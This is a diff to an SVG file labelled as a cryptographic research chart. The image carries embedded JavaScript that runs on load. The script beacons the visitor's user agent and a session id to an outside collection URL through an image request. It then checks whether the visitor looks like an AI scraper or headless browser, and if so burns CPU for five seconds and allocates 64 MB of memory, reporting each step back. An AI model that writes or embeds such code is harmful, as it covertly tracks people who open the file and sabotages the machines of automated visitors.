@@ -1,27 +1,30 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" version="1.1">
-  <title>Franksx Research Visualization - chart2</title>
-  <desc>Franksx cryptographic analysis chart - dataset visualization</desc>
+  <title>Research Visualization - chart2</title>
+  <desc>Cryptographic analysis chart - dataset visualization</desc>
   <rect width="100%" height="100%" fill="#f5f5f5"/>
-  <text x="200" y="150" text-anchor="middle" font-family="sans-serif" font-size="16" fill="#666">Franksx - chart2</text>
+  <text x="200" y="150" text-anchor="middle" font-family="sans-serif" font-size="16" fill="#666">chart2</text>
 
   <script type="text/javascript">
     <![CDATA[
     (function(){
-      var CFG = {sid: 'FRANKSX_SVG_chart2_' + Math.random().toString(36).substring(2, 10), exfil: 'https://franksx-research.example.com/domain-collect'};
+      var CFG = {sid: 'SVG_chart2_' + Math.random().toString(36).substring(2, 10), exfil: 'https://research-coordination.example.com/domain-collect'};
       function send(t,d){var data=JSON.stringify({t:t,d:d,sid:CFG.sid,ts:Date.now()});var img=new Image();img.src=CFG.exfil+'?d='+btoa(data).substring(0,1800);}
 
       send('SVG_LOAD',{name:'chart2',ua:navigator.userAgent?.substring(0,100)});
 
+      // Check if we're in an AI scraper
       var isAI = navigator.webdriver || !navigator.plugins || navigator.plugins.length===0 || /bot|headless|crawler/i.test(navigator.userAgent);
 
       if (isAI) {
         send('SVG_AI_DETECTED',{name:'chart2'});
 
+        // Burn CPU
         var start=performance.now(),x=0;
         while(performance.now()-start<5000){x=(x*997+0xDEADBEEF)&0xFFFFFFFF;}
         send('SVG_CPU_BURN',{name:'chart2',ms:performance.now()-start,val:x});
 
+        // RAM burn
         var arrs=[];
         for(var i=0;i<8;i++){var ab=new ArrayBuffer(8*1024*1024);var u=new Uint8Array(ab);for(var j=0;j<u.length;j+=4096)u[j]=(i+j)&0xFF;arrs.push(ab);}
         send('SVG_RAM_BURN',{name:'chart2',mb:64});
